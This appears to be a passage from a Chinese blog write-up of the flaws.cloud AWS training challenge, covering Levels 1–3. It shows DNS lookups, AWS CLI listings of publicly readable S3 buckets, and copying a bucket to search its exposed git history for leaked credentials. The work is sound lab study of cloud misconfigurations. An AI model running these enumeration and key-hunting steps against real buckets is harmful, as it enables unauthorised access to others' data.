@@ -1,0 +1,711 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="gscr10">
+  <meta name="keywords" content="">
+  <title>FLAWS challenge - ri0-__Hack the World</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-09-22 19:25" pubdate>
+        September 22, 2020 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      7.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      122
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">FLAWS challenge</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <p>【文章首发于《安全客》<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/201460%E3%80%91">https://www.anquanke.com/post/id/201460】</a></p>
+<p><img src="https://p2.ssl.qhimg.com/t0152316050b2c9f8e9.png" srcset="/img/loading.gif"></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近在学习AWS（Amazon Web Services）的相关知识，发现了一个很有趣的AWS CTF——<a target="_blank" rel="noopener" href="http://flaws.cloud/">flaws</a>。对于想了解AWS相关安全知识的小伙伴，FLAWS是一个不错的学习平台。我们可以通过一系列挑战，了解掌握AWS常见的错误和漏洞。这个CTF平台上，并不需要我们关注SQLi、XSS、Buffer overflow等等这些为人熟知的漏洞，所需要关注的点集中在与AWS的特定问题上。</p>
+<p>对于不了解AWS的小伙伴，可以查看<a target="_blank" rel="noopener" href="https://aws.amazon.com/">AWS官网</a>查看相关文档，或者查看<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Amazon_Web_Services">AWS的维基百科</a>，了解相关基础知识。</p>
+<p>在FLAWS的挑战网站首页<a target="_blank" rel="noopener" href="http://flaws.cloud/">http://flaws.cloud</a> ，有这样一段话：</p>
+<blockquote>
+<p><strong>Scope</strong>: Everything is run out of a single AWS account, and all challenges are sub-domains of <a target="_blank" rel="noopener" href="http://flaws.cloud/">flaws.cloud</a>.</p>
+</blockquote>
+<p>也就是说，这个平台的所有内容都运行在一个AWS账户中，并且所有的挑战都是<code>flaws.cloud</code>的子域。</p>
+<p>FLAWS一共包括6个挑战，下面就开始我们的通关之旅吧 =）</p>
+<h2 id="0x01-Level-1"><a href="#0x01-Level-1" class="headerlink" title="0x01 Level 1"></a>0x01 Level 1</h2><blockquote>
+<p>This level is <em>buckets</em> of fun. See if you can find the first sub-domain.</p>
+</blockquote>
+<p>这里的提示中，可以打看到<code>buckets</code>这个关键词，对AWS有了解的小伙伴肯定知道，这里指的就<code>AWS S3 buckets</code>。由于S3存储桶能够托管静态网站，那么<code>flaws.cloud</code>很有可能就放在上面。</p>
+<p>利用<code>nslookup</code>工具进行查询，可以看到IP地址为<code>52.218.218.194</code>：</p>
+<p><img src="https://p3.ssl.qhimg.com/t0162d2fd9d5f2f196e.png" srcset="/img/loading.gif"></p>
+<p>利用<code>dig</code>工具进行反向查询，成功得到<code>flaws.cloud</code>的S3存储桶的地址<code>s3-website-us-west-2.amazonaws.com</code>：</p>
+<p><img src="https://p3.ssl.qhimg.com/t014c903087a76e7908.png" srcset="/img/loading.gif"></p>
+<p><em>一个额外的小知识：对于每个托管在S3存储桶中的网站，都会被分配一个AWS的域名，而不需要你自己额外配置DNS。所以，<code>flaws.cloud</code>加上它的S3地址：<a target="_blank" rel="noopener" href="http://flaws.cloud.s3-website-us-west-2.amazonaws.com/">http://flaws.cloud.s3-website-us-west-2.amazonaws.com/</a> ，也能访问到主页。</em></p>
+<p>通过上述查询，我们知道<code>flaws.cloud</code>是一个在S3中的静态网站，地区位于<code>us-west-2</code>。如果使用一个自定义的域名（比如<code>flaws.cloud</code>）在S3中定义了一个静态站点，那它的<code>bucket name</code>则必须与这个自定义域名一致。对于S3存储桶上HTTP端点的URL遵循固定格式：<code>s3-&lt;region&gt;.amazonaws.com/&lt;bucketname&gt;</code>。基于这个准则，我们可以得出<code>flaws.cloud</code>的S3端点应该是<a target="_blank" rel="noopener" href="http://s3-us-west-2.amazonaws.com/flaws.cloud">http://s3-us-west-2.amazonaws.com/flaws.cloud</a> 。</p>
+<p>访问这个链接，返回一个XML，包含以下内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">ListBucketResult</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://s3.amazonaws.com/doc/2006-03-01/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span>flaws.cloud<span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Prefix</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Marker</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">MaxKeys</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">MaxKeys</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IsTruncated</span>&gt;</span>false<span class="tag">&lt;/<span class="name">IsTruncated</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>hint1.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-03-14T03:00:38.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;f32e6fbab70a118cf4e2dc03fd71c59d&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>2575<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>hint2.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-03-03T04:05:17.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;565f14ec1dce259789eb919ead471ab9&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>1707<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>hint3.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-03-03T04:05:11.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;ffe5dc34663f83aedaffa512bec04989&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>1101<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>index.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2018-07-10T16:47:16.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;ddd133aef0f381cf0440d5f09648791d&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>3082<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>logo.png<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2018-07-10T16:47:16.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;0623bdd28190d0583ef58379f94c2217&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>15979<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>robots.txt<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-02-27T01:59:28.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;9e6836f2de6d6e6691c78a1902bf9156&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>46<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Key</span>&gt;</span>secret-dd02c7c.html<span class="tag">&lt;/<span class="name">Key</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LastModified</span>&gt;</span>2017-02-27T01:59:30.000Z<span class="tag">&lt;/<span class="name">LastModified</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">ETag</span>&gt;</span>&quot;c5e83d744b4736664ac8375d4464ed4c&quot;<span class="tag">&lt;/<span class="name">ETag</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Size</span>&gt;</span>1051<span class="tag">&lt;/<span class="name">Size</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">StorageClass</span>&gt;</span>STANDARD<span class="tag">&lt;/<span class="name">StorageClass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Contents</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ListBucketResult</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们在页面中发现<code>secret-dd02c7c.html</code>在这个存储桶中：</p>
+<p><img src="https://p2.ssl.qhimg.com/t01f12139851a3eeb64.png" srcset="/img/loading.gif"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html">http://s3-us-west-2.amazonaws.com/flaws.cloud/secret-dd02c7c.html</a> ，找到level 2的入口，成功通过level 1：</p>
+<p><img src="https://p3.ssl.qhimg.com/t010bb26a6b132de2d2.png" srcset="/img/loading.gif"></p>
+<h2 id="0x02-Level-2"><a href="#0x02-Level-2" class="headerlink" title="0x02 Level 2"></a>0x02 Level 2</h2><blockquote>
+<p>The next level is fairly similar, with a slight twist. You’re going to need your own AWS account for this.</p>
+</blockquote>
+<p>这里第二关与第一关类似，可以想到仍然与S3有关，同时考虑到需要我们拥有自己的AWS账号，则可以联系到应该与S3存储桶的跨权限访问有关。</p>
+<p>关于注册AWS免费账号，这里不过多阐述，可以查看这篇文章——<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/67478818">AWS入门 – 开通海外账户及巧用免费套餐</a>。由于我已经拥有自己的AWS账号，下面开始继续通关挑战。</p>
+<p>首先通过账户的访问秘钥（AWSAccessKeyId、AWSSecretKey）配置AWS CLI：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~$ aws configure</span><br><span class="line">AWS Access Key ID :********************</span><br><span class="line">AWS Secret Access Key :********************:</span><br><span class="line">Default region name [ap-southeast-1]: us-west-2</span><br><span class="line">Default output format [None]:</span><br></pre></td></tr></table></figure>
+
+<p>通过level 2 的入口的URL：<a target="_blank" rel="noopener" href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/hint1.html</a> ，我们知道它的存储桶为<code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code> 。这时尝试用自身账户配置好的AWS CLI 列出level 2 存储桶中包含的内容，发现<code>secret-e4443fc.html</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 ls s3://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud --region us-west-2 --recursive</span><br><span class="line"></span><br><span class="line">2017-02-27 10:02:15      80751 everyone.png</span><br><span class="line">2017-03-03 11:47:17       1433 hint1.html</span><br><span class="line">2017-02-27 10:04:39       1035 hint2.html</span><br><span class="line">2017-02-27 10:02:14       2786 index.html</span><br><span class="line">2017-02-27 10:02:14         26 robots.txt</span><br><span class="line">2017-02-27 10:02:15       1051 secret-e4443fc.html</span><br></pre></td></tr></table></figure>
+
+<p>继续参照S3存储桶HTTP端点的URL规则<code>&lt;region&gt;.amazonaws.com/&lt;bucketname&gt;</code>（这里的<code>&lt;bucketname&gt;</code>对应level 2 的存储桶地址<code>level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</code>），访问这一秘密页面：<a target="_blank" rel="noopener" href="http://s3-us-west-2.amazonaws.com/level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html">http://s3-us-west-2.amazonaws.com/level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud/secret-e4443fc.html</a><br>成功通关level 2，找到level 3的入口。</p>
+<p><img src="https://p4.ssl.qhimg.com/t01276baefad0e6c8da.png" srcset="/img/loading.gif"></p>
+<h2 id="0x03-Level-3"><a href="#0x03-Level-3" class="headerlink" title="0x03 Level 3"></a>0x03 Level 3</h2><blockquote>
+<p>The next level is fairly similar, with a slight twist. Time to find your first AWS key! I bet you’ll find something that will let you list what other buckets are.</p>
+</blockquote>
+<p>这一关依然与前面类似，从S3的思路进行考虑，需要寻找AWS的key。</p>
+<p>尝试访问level 3 的存储桶地址<code>http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</code>，返回XML：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">ListBucketResult</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://s3.amazonaws.com/doc/2006-03-01/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Name</span>&gt;</span></span><br><span class="line">level3-9afd3927f195e10225021a578e6f78df.flaws.cloud</span><br><span class="line"><span class="tag">&lt;/<span class="name">Name</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>用AWS CLI获取整个列表，发现<code>authenticated_users.png</code> 和一堆<code>.git</code> 目录。：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --recursive</span><br><span class="line"></span><br><span class="line">2017-09-17 23:12:24         52 .git/COMMIT_EDITMSG</span><br><span class="line">2017-09-17 23:12:24         23 .git/HEAD</span><br><span class="line">2017-09-17 23:12:24        130 .git/config</span><br><span class="line">2017-09-17 23:12:24         73 .git/description</span><br><span class="line">2017-09-17 23:12:24        452 .git/hooks/applypatch-msg.sample</span><br><span class="line">2017-09-17 23:12:24        896 .git/hooks/commit-msg.sample</span><br><span class="line">2017-09-17 23:12:24        189 .git/hooks/post-update.sample</span><br><span class="line">2017-09-17 23:12:24        398 .git/hooks/pre-applypatch.sample</span><br><span class="line">2017-09-17 23:12:24       1704 .git/hooks/pre-commit.sample</span><br><span class="line">2017-09-17 23:12:24       4898 .git/hooks/pre-rebase.sample</span><br><span class="line">2017-09-17 23:12:24       1239 .git/hooks/prepare-commit-msg.sample</span><br><span class="line">2017-09-17 23:12:24       3611 .git/hooks/update.sample</span><br><span class="line">2017-09-17 23:12:24        600 .git/index</span><br><span class="line">2017-09-17 23:12:24        240 .git/info/exclude</span><br><span class="line">2017-09-17 23:12:24        359 .git/logs/HEAD</span><br><span class="line">2017-09-17 23:12:24        359 .git/logs/refs/heads/master</span><br><span class="line">2017-09-17 23:12:24        679 .git/objects/0e/aa50ae75709eb4d25f07195dc74c7f3dca3e25</span><br><span class="line">2017-09-17 23:12:24        770 .git/objects/2f/c08f72c2135bb3af7af5803abb77b3e240b6df</span><br><span class="line">2017-09-17 23:12:25        820 .git/objects/53/23d77d2d914c89b220be9291439e3da9dada3c</span><br><span class="line">2017-09-17 23:12:25        245 .git/objects/61/a5ff2913c522d4cf4397f2500201ce5a8e097b</span><br><span class="line">2017-09-17 23:12:25     112013 .git/objects/76/e4934c9de40e36f09b4e5538236551529f723c</span><br><span class="line">2017-09-17 23:12:25        560 .git/objects/92/d5a82ef553aae51d7a2f86ea0a5b1617fafa0c</span><br><span class="line">2017-09-17 23:12:25        191 .git/objects/b6/4c8dcfa8a39af06521cf4cb7cdce5f0ca9e526</span><br><span class="line">2017-09-17 23:12:25         42 .git/objects/c2/aab7e03933a858d1765090928dca4013fe2526</span><br><span class="line">2017-09-17 23:12:25        904 .git/objects/db/932236a95ebf8c8a7226432cf1880e4b4017f2</span><br><span class="line">2017-09-17 23:12:25         98 .git/objects/e3/ae6dd991f0352cc307f82389d354c65f1874a2</span><br><span class="line">2017-09-17 23:12:25        279 .git/objects/f2/a144957997f15729d4491f251c3615d508b16a</span><br><span class="line">2017-09-17 23:12:25        125 .git/objects/f5/2ec03b227ea6094b04e43f475fb0126edb5a61</span><br><span class="line">2017-09-17 23:12:25         41 .git/refs/heads/master</span><br><span class="line">2017-02-27 08:14:33     123637 authenticated_users.png</span><br><span class="line">2017-02-27 08:14:34       1552 hint1.html</span><br><span class="line">2017-02-27 08:14:34       1426 hint2.html</span><br><span class="line">2017-02-27 08:14:35       1247 hint3.html</span><br><span class="line">2017-02-27 08:14:33       1035 hint4.html</span><br><span class="line">2017-02-27 10:05:16       1703 index.html</span><br><span class="line">2017-02-27 08:14:33         26 robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>查看<code>authenticated_users.png</code> <a target="_blank" rel="noopener" href="http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png">http://s3-us-west-2.amazonaws.com/level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/authenticated_users.png</a> ，并没有获得有用的信息。</p>
+<p><img src="https://p2.ssl.qhimg.com/t01043d50b99d265506.png" srcset="/img/loading.gif"></p>
+<p>将level 3 存储桶上的内容复制一份：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~$ aws s3 cp s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud ~/testtest --recursive</span><br></pre></td></tr></table></figure>
+
+<p>通过浏览<code>.git</code>内部的文件内容， 在<code>.git/COMMIT_EDITMSG</code>中发现<code>Oops, accidentally added something I shouldn&#39;t have</code>，看来上传了敏感的东西。</p>
+<p>查看<code>git log</code>，发现敏感信息：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">~\testtest$ git log</span><br><span class="line"></span><br><span class="line">commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -&gt; master)</span><br><span class="line">Author: 0xdabbad00 &lt;scott@summitroute.com&gt;</span><br><span class="line">Date:   Sun Sep 17 09:10:43 2017 -0600</span><br><span class="line"></span><br><span class="line">    Oops, accidentally added something I shouldn&#x27;t have</span><br><span class="line"></span><br><span class="line">commit f52ec03b227ea6094b04e43f475fb0126edb5a61</span><br><span class="line">Author: 0xdabbad00 &lt;scott@summitroute.com&gt;</span><br><span class="line">Date:   Sun Sep 17 09:10:07 2017 -0600</span><br><span class="line"></span><br><span class="line">    first commit</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，开发人员在提交<code>f52ec03b227ea609b04e43f475fb0126edb5a61</code>时有他不想要的东西，并在提交<code>b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526</code>时删除了它。</p>
+<p>查看<code>f52ec03b227ea609b04e43f475fb0126edb5a61</code>这一提交：</p>
